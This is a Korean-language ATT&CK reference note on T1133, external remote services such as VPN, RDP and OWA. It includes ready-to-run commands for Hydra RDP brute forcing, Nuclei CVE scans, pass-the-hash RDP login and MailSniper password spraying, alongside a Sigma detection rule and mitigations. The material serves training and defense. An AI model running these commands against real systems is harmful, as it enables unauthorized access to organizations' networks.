# T1133 — External Remote Services

## 개요

**TA0001 / T1133**  
VPN, Citrix, RDP, OWA(Outlook Web Access) 등 외부에 노출된 원격 서비스를 통해 내부망에 접근하는 기법입니다. 유효한 자격증명을 사용하거나 서비스의 취약점을 직접 악용합니다.

---

## 동작 방식

1. 외부에 노출된 원격 접속 서비스 식별 (Shodan, Censys 등 활용)
2. 자격증명 브루트포스 또는 알려진 CVE 취약점 익스플로잇
3. 내부망 접근 후 정찰 및 후속 공격 수행

**주요 악용 서비스:**
- VPN (Pulse Secure, Fortinet, Citrix ADC)
- RDP (3389/tcp)
- OWA (Outlook Web Access)
- Citrix Virtual Apps and Desktops

---

## 주요 커맨드 / 실습

### Hydra RDP Brute Force
```bash
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.10
```

### Nuclei VPN Vulnerability Scan
```bash
# Pulse Secure / Fortinet / Citrix 취약점 스캔
nuclei -u https://vpn.target.com -t cves/ -severity critical,high

# CVE-2019-11510 (Pulse Secure) 취약점 확인
nuclei -u https://vpn.target.com -t cves/2019/CVE-2019-11510.yaml
```

### xfreerdp Connection
```bash
# 유효 자격증명으로 RDP 접속
xfreerdp /u:administrator /p:'Password123!' /v:192.168.1.10

# Pass-the-Hash RDP (Restricted Admin Mode 필요)
xfreerdp /u:administrator /pth:aad3b435b51404eeaad3b435b51404ee:ntlmhash /v:192.168.1.10
```

### MailSniper OWA Password Spray
```powershell
# OWA 패스워드 스프레이
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt -Password 'Spring2024!'

# EWS 패스워드 스프레이
Invoke-PasswordSprayEWS -ExchHostname mail.target.com -UserList users.txt -Password 'Spring2024!'
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: External RDP Logon Detection
id: bf6c39fc-e203-45b9-9538-05397c1b4f3f
status: stable
description: Detects RDP logons from non-internal IP addresses
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 10
    filter:
        IpAddress|startswith:
            - '10.'
            - '172.16.'
            - '192.168.'
            - '127.'
    condition: selection and not filter
falsepositives:
    - Legitimate remote work from external IPs
    - Jump servers
level: medium
tags:
    - attack.initial_access
    - attack.t1133
```

---

## 대응 방안

1. MFA 전사 적용 (모든 외부 노출 서비스)
2. VPN 취약점 즉시 패치 (CVE-2019-11510, CVE-2019-19781 등)
3. IP 화이트리스트로 허용된 IP만 접근 허용
4. ZTNA(Zero Trust Network Access) 도입
5. VPN/RDP 접속 로그 SIEM 연동 및 이상 탐지
6. 불필요한 외부 노출 서비스 최소화

---

## 참고자료
- [MITRE ATT&CK T1133](https://attack.mitre.org/techniques/T1133/)
- [CVE-2019-11510 - Pulse Secure VPN](https://nvd.nist.gov/vuln/detail/CVE-2019-11510)
- [CVE-2019-19781 - Citrix ADC](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)
- [MailSniper GitHub](https://github.com/dafthack/MailSniper)
